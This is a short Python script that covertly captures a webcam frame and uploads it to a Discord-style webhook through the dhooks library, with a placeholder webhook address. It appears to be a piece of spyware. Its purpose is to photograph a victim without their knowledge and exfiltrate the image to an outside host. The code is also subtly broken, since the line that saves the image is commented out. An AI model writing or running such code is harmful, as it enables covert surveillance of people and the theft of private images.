import cv2
from dhooks import Webhook, File
import os
import getpass
# take image -> save it to root path -> send image -> del image
user = getpass.getuser()
path_img = f'''C:/Users/{user}/webcam.jpg'''
# take img
video = cv2.VideoCapture(0) 
check, frame = video.read()
#cv2.imshow("Capturing",frame)
#showPic = cv2.imwrite(path_img,frame)
video.release()
cv2.destroyAllWindows
# send on webhook
hook = "L!Nk123"
hook1 = Webhook(hook)
file = File(path_img)
hook1.send(file=file)